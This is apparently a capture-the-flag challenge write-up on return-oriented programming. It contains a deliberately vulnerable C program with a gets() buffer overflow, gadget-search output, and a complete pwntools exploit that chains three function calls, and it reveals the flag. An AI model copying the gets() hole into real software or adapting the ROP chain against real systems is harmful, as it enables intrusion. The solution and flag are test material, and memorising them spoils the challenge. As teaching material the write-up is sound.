# Rop 2 Win

Difficulty Level: Hard
 
I have encrypted the flag and hid the decoder in 3 parts. Call the functions in sequence to win

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- You will need to know about gadgets which is essential for Return Oriented Programming ([ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/))


## Deployment
#### Generate encrypted flag
```
cd generate
make encode
```
#### Generate challenge
```
cd generate
make vuln
```

## Solution
Looking at the source code, we see 3 functions of which require 2 arguments each

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "base64.h"
#include "rc4.h"
#include "keys.h"

unsigned char ciphertext[64];
unsigned char rc4_out[64];
unsigned char flag[64];
int result;

int check1 = 0;
int check2 = 0;

void function_one(long arg1, long arg2) {
	if (arg1 == 0xdeadbeef && arg2 == 0xcafebabe){
		// Read file

		FILE *f = fopen("flag.enc", "rb");
		if (f == NULL) {
			printf("[-] Enc File is Missing.\n");
			exit(0);
		}

		fgets(ciphertext, sizeof(ciphertext), f);

		// Part 1: Xor
		printf("%s\n", "[+] Part 1: OK! Xor-ing encrypted flag...");
		for (size_t i = 0, len = strlen(ciphertext); i < len; i++)
			ciphertext[i] = ciphertext[i] ^ xor_key[i];

		check1 = 1;
	} else {
		printf("[-] Function 1 failed\n");
	}
}

void function_two(long arg1, long arg2) {
	if (arg1 == 0xdeadbeef && arg2 == 0xcafebabe && check1 == 1){
		// Part 2: RC4
		printf("%s\n", "[+] Part 2: OK! RC4-ciphering encrypted flag...");
		RC4(RC4_key, ciphertext, rc4_out);
		check2 = 1;
	} else {
		printf("[-] Function 2 failed\n");
	}
}

void function_three(long arg1, long arg2) {
	if (arg1 == 0xdeadbeef && arg2 == 0xcafebabe && check1 == 1 && check2 == 1){
		// Part 3: Base64 Decode

		printf("%s\n", "[+] Part 3: OK! Base64-decoding flag...");
		
		char *base64_in = (char*) rc4_out;
		size_t flag_len = sizeof(flag);

		result = base64decode(base64_in, strlen(base64_in), flag, &flag_len);

		printf("%s\n", flag);
	} else {
		printf("[-] Function 3 failed\n");
	}
}

void vuln(){
	char buffer[64] = {0x00};
	printf("%s\n", "Hey man how's it going! Wanna ROP?");

	gets(buffer);
}

int main(int argc, char** argv) {
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);

	vuln();
}
```

All we need to do is call function 1, 2, 3 with arguments 0xdeadbeef and 0xcafebabe.

This challenge introduces the need for gadgets. As we will be calling multiple functions, we need a way to remove the arguments for the previous function so that we can return to the next function. This can be done by finding a gadget such as ‘pop eax; ret;’ which will remove 1 line of the stack. Since we are dealing with 2 arguments we will need to find one with 2 pops in a row. 

You can find gadgets easily with 
- ropper -f ./rop2win or 
- ROPgadget --binary ./rop2win

```bash
$ ROPgadget --binary ./rop2win --only 'pop|ret'
Gadgets information
============================================================
0x08049757 : pop ebp ; ret
0x08049754 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804901e : pop ebx ; ret
0x08049756 : pop edi ; pop ebp ; ret
0x08049755 : pop esi ; pop edi ; pop ebp ; ret
0x0804900a : ret
0x08049766 : ret 0x289b
0x0804991b : ret 0x458b
0x080499bc : ret 0x4d8b
0x08049290 : ret 0x8b8d
0x0804959b : ret 0xc889
0x08049597 : ret 0xd201
0x0804915b : ret 0xe8c1

Unique gadgets found: 13
```

For this I will be using `pop edi; pop ebp; ret` as the gadget to remove the 2 arguments. It will look something like this

| Stack Value              |
| ------------------------ |
| Argument 2 (0xcafebabe)  |
| Argument 1 (0xdeadbeef)  |
| Fake return Address BBBB |
| Function 3               |
| Argument 2 (0xcafebabe)  |
| Argument 1 (0xdeadbeef)  |
| Gadget                   |
| Function 2               |
| Argument 2 (0xcafebabe)  |
| Argument 1 (0xdeadbeef)  |
| Gadget                   |
| Function 1               |
| AAAAAAAAAAAAAAAAAAAAAAAA |

```python
from pwn import *

def main():
	func_one = p32(0x080491c2)
	func_two = p32(0x080492cf)
	func_three = p32(0x08049355)

	#0x08049756: pop edi; pop ebp; ret;
	gadget = p32(0x08049756)

	padding = b'A' * 76

	arg1 = p32(0xdeadbeef)
	arg2 = p32(0xcafebabe)

	payload = padding
	payload += func_one
	payload += gadget
	payload += arg1
	payload += arg2
	payload += func_two
	payload += gadget
	payload += arg1
	payload += arg2
	payload += func_three
	payload += b'BBBB'
	payload += arg1
	payload += arg2

	io = process('./rop2win')
	io.sendline(payload)
	io.interactive()
	#print(payload)

if __name__ == '__main__':
	main()
```
### Flag
19C4{R0P_1s_Pr3tty_Fun!}
